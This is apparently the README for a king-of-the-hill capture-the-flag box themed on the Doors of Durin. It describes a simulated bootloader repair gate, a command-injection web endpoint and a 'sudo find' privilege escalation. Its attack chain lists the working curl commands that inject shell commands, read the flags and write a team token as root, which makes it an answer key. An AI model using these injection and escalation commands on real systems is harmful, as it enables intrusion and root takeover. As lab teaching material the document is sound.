# Hill 5 - The Doors of Durin (repair-gated boot → command injection → sudo find)

*Theme: The Lord of the Rings / Moria.* A "repair-first" hill: the box ships in a
**broken boot state** and the vulnerable service will not run until an attacker
**repairs the bootloader record** through the exposed rescue console. Only then does
the entry vuln come online. This adds a recovery/sysadmin skill on top of exploitation.

- **Repair gate:** the box boots into *rescue mode*. `durin.cfg` (a simulated
  `grub.cfg`) is corrupted: wrong `root=` device, missing passphrase, `boot=off`.
  The rescue console (`POST /rescue`) accepts a corrected record. A valid fix must:
  - point `root=` at the first hall → `set root=(hd0,gpt1)`
  - supply the word of power → `set passphrase="mellon"` *(Elvish for "friend" -     "speak, friend, and enter")*
  - enable boot → `set boot=on`
- **Entry:** once booted, the delving console `GET /mine?q=` passes input to a shell
  → **command injection**. Port 80 (published on 8085 locally). Foothold: `moria`.
- **Privesc:** `moria` may run `sudo /usr/bin/find` (GTFOBins):
  `sudo find /etc/hostname -exec cat /root/root.txt \;`. Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Run locally

    docker compose up -d --build
    # app: http://localhost:8085/

## Attack chain

    # 1. repair the boot record (open the gate)
    curl -s -X POST http://127.0.0.1:8085/rescue --data-urlencode \
      'cfg=set root=(hd0,gpt1)
    set passphrase="mellon"
    set boot=on'

    # 2. foothold via command injection -> user flag
    curl -s -G http://127.0.0.1:8085/mine --data-urlencode 'q=x; cat /home/moria/user.txt'

    # 3. privesc via sudo find -> root flag
    curl -s -G http://127.0.0.1:8085/mine --data-urlencode \
      'q=x; sudo find /etc/hostname -exec cat /root/root.txt \;'

    # 4. take the hill: write your team token to /root/king.txt
    curl -s -G http://127.0.0.1:8085/mine --data-urlencode \
      'q=x; sudo find /etc/hostname -exec sh -c "echo TOK-YOUR-TEAM > /root/king.txt" \;'

## Reset behaviour

`reset.sh` restores the `sudo find` privesc **and re-breaks the boot** (back to rescue
mode), so the entry puzzle is fresh for the next attacker. It does **not** touch
`king.txt`. Defence therefore means keeping the gate booted and kicking rivals - a
reset (scheduled or green-team) forces re-repair to regain entry.

## Making the repair "real" on a VM

In the container the bootloader is faithfully **simulated** so it runs in the docker
demo. On a real VM you can make the repair a genuine low-level fix instead: ship the
box with a broken `/boot/grub/grub.cfg` or a bad `/etc/fstab` entry that drops the
machine into emergency/rescue mode, and require the attacker to fix it from the VM
console (GRUB edit / `mount -o remount,rw /` / correct the UUID) before SSH/the
service comes up. The web rescue console here is the container-friendly stand-in for
that flow. See `../../../docs` (wiki: "add your own hill") for wiring a VM-only repair
step into `setup-hill.sh`.
